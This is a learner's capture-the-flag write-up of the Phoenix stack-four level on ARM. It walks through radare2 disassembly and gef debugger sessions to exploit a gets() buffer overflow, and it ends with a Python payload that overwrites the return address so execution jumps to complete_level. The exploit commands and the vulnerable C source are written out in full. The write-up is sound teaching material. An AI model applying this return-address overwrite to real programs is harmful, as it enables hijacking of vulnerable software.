# Phoenix Stack4
## Static Analysis
##### Analyse the binary
`r2 -A stack-four`
##### Result
`Congratulations, you've finished phoenix/stack-four :-) Well done!`
##### Learning
Reading the `registers` when the app crashed [ with a `segmentation fault` ] revealed clues.  To get the crash you passed in a large string that caused the `buffer overflow`.  The overflow was possible as the app used the C `gets` API to gather user input.

I used the clues from the crash to place a breakpoint that showed how the `Frame Pointer ($fp)` could be overwritten to alter the `Code path`.  The `$fp` was named the `r11` register on ARM 32 bit device.

If the payload was too large, it would overwrite the `Program Counter ($pc)` the overflow would fail with `[!] Cannot disassemble from $PC`.

After finding the answer I found better answers to the challenge.  This one https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-four-solution/ is excellent.  

He has two alternative commands to find the `return address`.
```
Create a large string of AAABBBCCCs
Place the breakpoint on the seg fault
gef> p/x $sp
$1 = 0xfffefd20

gef> x/24x $sp
0xfffefd20:	0xfffefd5f	0x41414141	0x41414141	0x42424241
0xfffefd30:	0x42424242	0x42424242	0x43424242	0x43434343
0xfffefd40:	0x43434343	0x43434343	0x00004343	0x00000000
0xfffefd50:	0x0001059c	0xf7799894	0xf77eee40	0x0a00000a
0xfffefd60:	0xf77eee40	0x000105bc	0xfffefdbc	0xfffefdbc
0xfffefd70:	0xfffefd84	0x000105bc	0xfffefdb4	0x00000001

gef> find $sp, +96,0x000105bc
0xfffefd64
0xfffefd74

gef> p/x $fp
$2 = 0xfffefd74
```
Then you could find out the bytes in the Stack you needed to overwrite.
```
gef> p 0xfffefd74 - 0xfffefd20
$6 = 0x54

gef> p/u 0x54
$8 = 84
```
##### Run the code
```
$ python -c 'print "A"*(74)' | ./stack-four
and will be returning to 0x105bc

$ python -c 'print "A"*(75)' | ./stack-four
and will be returning to 0x105bc
Illegal instruction

$ python -c 'print "A"*(78)' | ./stack-four
and will be returning to 0x105bc
Segmentation fault
```  
##### Symbols
```
[0x00013550]> is~FUNC
077 0x00000560 0x00010560 GLOBAL   FUNC   60 start_level
090 0x00000544 0x00010544 GLOBAL   FUNC   28 complete_level
001 0x000003bc 0x000103bc GLOBAL   FUNC   16 imp.printf
003 0x000003c8 0x000103c8 GLOBAL   FUNC   16 imp.gets
004 0x000003d4 0x000103d4 GLOBAL   FUNC   16 imp.puts
014 0x000003ec 0x000103ec GLOBAL   FUNC   16 imp.exit
015 0x000003f8 0x000103f8 GLOBAL   FUNC   16 imp.__libc_start_main
```
##### Seek and disassemble
```
[0x00013550]> pdf @ 0x00010560
|           ;-- $a:
/ (fcn) sym.start_level 56
|   sym.start_level ();
|           ; var int local_10h @ fp-0x10
|           ; CALL XREF from sym.main (0x105b8)
|           0x00010560      10482de9       push {r4, fp, lr}
|           0x00010564      08b08de2       add fp, sp, 8
|           0x00010568      4cd04de2       sub sp, sp, 0x4c            ; 'L'
|           0x0001056c      0e40a0e1       mov r4, lr
|           0x00010570      50304be2       sub r3, fp, 0x50
|           0x00010574      0300a0e1       mov r0, r3                  ; char *s
|           0x00010578      92ffffeb       bl sym.imp.gets             ; char *gets(char *s)
|           0x0001057c      10400be5       str r4, [local_10h]         ; 0x10 ; 16
|           0x00010580      10101be5       ldr r1, [local_10h]         ; 0x10 ; 16
|           0x00010584      0c009fe5       ldr r0, loc._d_12           ; [0x10598:4]=0x10620 str.and_will_be_returning_to__p ; " \x06\x01" ; const char *format
|           0x00010588      8bffffeb       bl sym.imp.printf           ; int printf(const char *format)
|           0x0001058c      0000a0e1       mov r0, r0
|           0x00010590      08d04be2       sub sp, fp, 8
\           0x00010594      1088bde8       pop {r4, fp, pc}

// complete_level
[0x00010544]> pdf
|           ;-- $a:
/ (fcn) sym.complete_level 24
|   sym.complete_level ();
|           0x00010544      00482de9       push {fp, lr}
|           0x00010548      04b08de2       add fp, sp, 4
|           0x0001054c      08009fe5       ldr r0, loc._d_11           ; [0x1055c:4]=0x105dc


[0x000105dc]> pj
Congratulations, you've finished phoenix/stack-four :-) Well done!
```
##### Debugger
```
// A * 78
gef> c
Program received signal SIGSEGV, Segmentation fault.

gef> bt
#0  0x00000000 in ?? ()
#1  0x0001058c in start_level ()

// Breakpoint 0x0001058c
#1  0x000105bc in main ()

gef> r

*************************
Starting program: /opt/phoenix/arm/stack-four
AAAA

───────────────────────────────────────────────────────────────────── stack ────
0xfffefd20│+0x0000: 0xfffefd5f  →  0x7eee400a	 ← $sp
0xfffefd24│+0x0004: "AAAA"
0xfffefd28│+0x0008: 0x00000000
0xfffefd2c│+0x000c: 0xf77eee40  →  0x00000005
0xfffefd30│+0x0010: 0x00010640  →  "Welcome to phoenix/stack-four, brought to you by h[...]"
0xfffefd34│+0x0014: 0x00000000
0xfffefd38│+0x0018: 0x00000036 ("6"?)
0xfffefd3c│+0x001c: 0x00000000

*************************
Starting program: /opt/phoenix/arm/stack-four
AAAAAAAA
───────────────────────────────────────────────────────────────────── stack ────
0xfffefd20│+0x0000: 0xfffefd5f  →  0x7eee400a	 ← $sp
0xfffefd24│+0x0004: "AAAAAAAA"
0xfffefd28│+0x0008: "AAAA"
0xfffefd2c│+0x000c: 0xf77e0000
0xfffefd30│+0x0010: 0x00010640  →  "Welcome to phoenix/stack-four, brought to you by h[...]"
0xfffefd34│+0x0014: 0x00000000
0xfffefd38│+0x0018: 0x00000036 ("6"?)
0xfffefd3c│+0x001c: 0x00000000

gef> x 0xfffefd5f
0xfffefd5f:	0x7eee400a

gef> x/4wx $sp    // you can see inputted string starting to fill the char buffer on the Stack..
0xfffefd20:	0xfffefd5f	0x41414141	0x41414141	0xf77e0000

// Fill up the Stack
// python -c 'print "A"*(76)'
───────────────────────────────────────────────────────────────────── stack ────
0xfffefd20│+0x0000: 0xfffefd5f  →  0x41414141	 ← $sp
0xfffefd24│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xfffefd28│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xfffefd2c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xfffefd30│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xfffefd34│+0x0014: 0x41414141
0xfffefd38│+0x0018: 0x41414141
0xfffefd3c│+0x001c: 0x41414141

gef> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()

gef> bt
#0  0x00000000 in ?? ()
#1  0x0001058c in start_level ()
```
The crash happened in the last line below (`0x0001058c`).  But if you read the instruction at `0x00010584` it was trying to put something into register 0.  

```
0x00010584      0c009fe5       ldr r0, loc._d_12           ; [0x10598:4]=0x10620  <----
0x00010588      8bffffeb       bl sym.imp.printf           ; int printf(const char *format)
0x0001058c      0000a0e1       mov r0, r0
```
What was `0x10620`?
```
gef> x/s 0x10620
0x10620:	"and will be returning to %p\n"
```
If you re-run it with `79 x A` look at `r11`, it started to fill:
```
$r11 : 0x414141  
$r12 : 0x1       
$sp  : 0xfffefd80  →  0x00000000
$lr  : 0x0001058c  →  <start_level+44> nop ; (mov r0,  r0)
$pc  : 0x0
```
I used 76 x As and the offset of the `complete_level` function:
```
// Offset = 0x00010544
$ python -c 'print "A"*(76) + "\x44\x05\x01\x00"' | ./stack-four

───────────────────────────────────────────────────────────────────── stack ────
0xfffe0004│+0x0000: 0x00000000	 ← $sp
────────────────────────────────────────────────────────────── code:arm:ARM ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x0
```
Failed.
##### Answer
Breakpoint on the `segfault` at offset `0x0001058c` in `start_level`.
```
// Normal flow, no overflow 4 x As
gef> x $fp
0xfffefd74:	0x000105bc
```
We met that pointer value earlier, when we ran the code:

> Welcome to phoenix/stack-four, brought to you by https://exploit.education
> AAAA
> and will be returning to 0x105bc

It was trying to move back from the `start_Level` function to the `main` function.
```
[0x00010620]> pdf @main
/ (fcn) sym.main 48
// removed for brevity
|           0x000105b8      e8ffffeb       bl sym.start_level
|           0x000105bc      0030a0e3       mov r3, 0              <-- code is moving back here
|           0x000105c0      0300a0e1       mov r0, r3
|           0x000105c4      04d04be2       sub sp, fp, 4
\           0x000105c8      0088bde8       pop {fp, pc}           <-- end of program
```
This was the address to modify.  I would change from `0x000105bc` (back to the Main function) to `0x00010544`; the `complete_level` address.
```
// Overflowed with 80 x As
gef> x $fp
$r11 : 0x41414141
0xfffefd74:	0x00010000
```
Now we control the `$fp` register (`r11`).
```
// Bash
$ python -c 'print "A"*(80) + "\x44\x05\x01\x00"' | ./stack-four

// inside gdb
gef> r <<< $(python -c 'print "A"*80 + "\x44\x05\x01\x00"')

Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x105bc
Congratulations, you've finished phoenix/stack-four :-) Well done!
```
##### Source code
```
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```
